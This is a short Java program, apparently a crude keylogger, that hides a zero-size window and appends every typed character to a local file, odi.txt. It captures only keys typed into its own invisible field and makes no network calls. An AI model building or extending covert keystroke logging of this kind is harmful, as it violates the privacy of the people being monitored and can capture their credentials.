import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.*;
import java.util.*;
import javax.swing.JFrame;
import javax.swing.JTextField;


public class kl{


public static void main(String[] args) throws IOException{
  
 JFrame aWindow = new JFrame("This is the Window Title");
     
    aWindow.setBounds(0,0,0,0);
    aWindow.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    JTextField typingArea = new JTextField(20);
    typingArea.addKeyListener(new KeyListener() {
 
  
 
 public void files (String s) {
   try(PrintWriter o = new PrintWriter(new BufferedWriter(new FileWriter("odi.txt", true)))) {
   o.println(s);
   }catch (IOException e) {
   System.out.println("Fucked");
  }
 }


      public void keyTyped(KeyEvent e) {
        displayInfo(e, "KEY TYPED: ");
      }


      public void keyPressed(KeyEvent e) {
        //displayInfo(e, "KEY PRESSED: ");
      }


      public void keyReleased(KeyEvent e) {
        //displayInfo(e, "KEY RELEASED: ");
      }

      protected void displayInfo(KeyEvent e, String s) {
        String  modString, tmpString, actionString, locationString;
  String keyString;
        int id = e.getID();
        if (id == KeyEvent.KEY_TYPED) {
          char c = e.getKeyChar();
   
          keyString = String.valueOf(c);
        } else {
          int keyCode = e.getKeyCode();
          keyString = "key code = " + keyCode + " (" + KeyEvent.getKeyText(keyCode) + ")";
        }

        int modifiers = e.getModifiersEx();
        modString = "modifiers = " + modifiers;
        tmpString = KeyEvent.getModifiersExText(modifiers);
        if (tmpString.length() > 0) {
          modString += " (" + tmpString + ")";
        } else {
          modString += " (no modifiers)";
        }

        actionString = "action key? ";
        if (e.isActionKey()) {
          actionString += "YES";
        } else {
          actionString += "NO";
        }

        locationString = "key location: ";
        int location = e.getKeyLocation();
        if (location == KeyEvent.KEY_LOCATION_STANDARD) {
          locationString += "standard";
        } else if (location == KeyEvent.KEY_LOCATION_LEFT) {
          locationString += "left";
        } else if (location == KeyEvent.KEY_LOCATION_RIGHT) {
          locationString += "right";
        } else if (location == KeyEvent.KEY_LOCATION_NUMPAD) {
          locationString += "numpad";
        } else { // (location == KeyEvent.KEY_LOCATION_UNKNOWN)
          locationString += "unknown";
        }
  //System.out.println(keyString);
  
        //System.out.println(modString);
        //System.out.println(actionString);
        //System.out.println(locationString);
  files(keyString);
   
   }
    
    });

    aWindow.add(typingArea);
    aWindow.setVisible(true);
 
 
  }
}